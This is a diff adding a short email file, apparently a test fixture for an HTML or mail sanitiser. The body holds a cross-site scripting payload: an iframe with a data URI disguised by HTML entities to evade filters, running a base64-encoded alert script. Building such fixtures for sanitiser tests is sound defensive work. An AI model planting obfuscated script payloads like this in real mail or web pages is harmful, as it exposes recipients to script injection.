@@ -1,0 +1,4 @@
+From: jimboman@ix.netcom.com
+To: greg.piper@enron.com, sally.beck@enron.com, louise.kitchen@enron.com
+Subject: XSS Test Mail
+<iframe src="dat&NewLine;a&colon;text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
